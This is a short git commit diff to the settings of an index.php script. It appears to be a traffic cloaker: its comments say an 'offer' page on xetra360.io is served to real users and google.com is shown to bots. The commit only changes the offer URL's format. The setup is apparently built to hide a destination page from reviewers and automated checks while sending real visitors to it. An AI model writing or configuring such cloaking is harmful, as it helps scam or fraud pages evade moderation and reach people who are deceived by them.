e0da2397d6e2206cd87801a315ba40c6d3951315
expo353 <victorspencer173@gmail.com>
2024-12-28 15:58:46 -0800

    Update index.php

--- index.php
+++ index.php
@@ -3,7 +3,7 @@
 $HCSET['PASSIVE'] = false;
 
 /* Required settings     */
-$HCSET['OFFER_PAGE'] = 'https://xetra360.io/main.php';//PHP/HTML file or URL offer used for real users
+$HCSET['OFFER_PAGE'] = 'xetra360.io/main.php';//PHP/HTML file or URL offer used for real users
 $HCSET['WHITE_PAGE'] = 'https://google.com';//PHP/HTML file or URL used for bots
 $HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
